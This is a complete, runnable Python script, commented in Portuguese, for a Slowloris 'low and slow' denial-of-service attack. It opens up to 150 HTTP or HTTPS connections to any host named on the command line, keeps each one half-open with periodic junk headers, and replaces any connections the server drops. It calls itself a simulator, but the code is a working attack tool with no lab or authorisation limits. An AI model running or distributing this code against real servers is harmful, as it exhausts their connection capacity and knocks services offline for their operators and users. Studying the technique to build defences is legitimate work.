#!/usr/bin/env python3
import sys
import argparse
import socket
import ssl
import time
import random
import threading

# Configuração de cores
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
]

list_of_sockets = []
running = True

def init_socket(ip, port, https=False):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    if https:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        s = context.wrap_socket(s, server_hostname=ip)

    s.connect((ip, port))

    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
    s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode("utf-8"))
    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
    return s

def main():
    global running, list_of_sockets

    parser = argparse.ArgumentParser(description="Simulador de Slowloris (Low & Slow Attack)")
    parser.add_argument("host", help="Host alvo (IP ou domínio)")
    parser.add_argument("--port", type=int, default=80, help="Porta alvo (default: 80)")
    parser.add_argument("--https", action="store_true", help="Usar SSL/TLS (default: False)")
    parser.add_argument("--sockets", type=int, default=150, help="Número de sockets a manter (default: 150)")
    parser.add_argument("--sleeptime", type=int, default=15, help="Tempo entre pacotes de keep-alive (default: 15s)")

    args = parser.parse_args()

    print(f"{Colors.HEADER}=== Iniciando Slowloris Simulator ==={Colors.ENDC}")
    print(f"Alvo: {args.host}:{args.port} (HTTPS: {args.https})")
    print(f"Sockets Alvo: {args.sockets}")

    # Resolver IP se for domínio
    try:
        ip = socket.gethostbyname(args.host)
    except socket.gaierror:
        print(f"{Colors.FAIL}Erro: Não foi possível resolver o host.{Colors.ENDC}")
        sys.exit(1)

    print(f"IP Resolvido: {ip}")
    print(f"{Colors.OKBLUE}Criando sockets iniciais...{Colors.ENDC}")

    for i in range(args.sockets):
        try:
            s = init_socket(ip, args.port, args.https)
            list_of_sockets.append(s)
            sys.stdout.write(f"\rSockets criados: {len(list_of_sockets)}")
            sys.stdout.flush()
        except socket.error as e:
            pass
            # print(f"\nErro ao criar socket: {e}")

    print(f"\n{Colors.OKGREEN}Sockets iniciais criados. Iniciando loop de manutenção.{Colors.ENDC}")

    try:
        while running:
            print(f"{Colors.OKBLUE}[*] Enviando keep-alive headers... Sockets ativos: {len(list_of_sockets)}{Colors.ENDC}")

            # Tentar enviar dados em cada socket
            for s in list(list_of_sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except socket.error:
                    list_of_sockets.remove(s)

            # Recriar sockets perdidos
            diff = args.sockets - len(list_of_sockets)
            if diff > 0:
                print(f"{Colors.WARNING}Recriando {diff} sockets perdidos...{Colors.ENDC}")
                for _ in range(diff):
                    try:
                        s = init_socket(ip, args.port, args.https)
                        list_of_sockets.append(s)
                    except socket.error:
                        pass

            time.sleep(args.sleeptime)

    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}Interrompido pelo usuário.{Colors.ENDC}")
        running = False

    print("Fechando sockets...")
    for s in list_of_sockets:
        try:
            s.close()
        except:
            pass

if __name__ == "__main__":
    main()
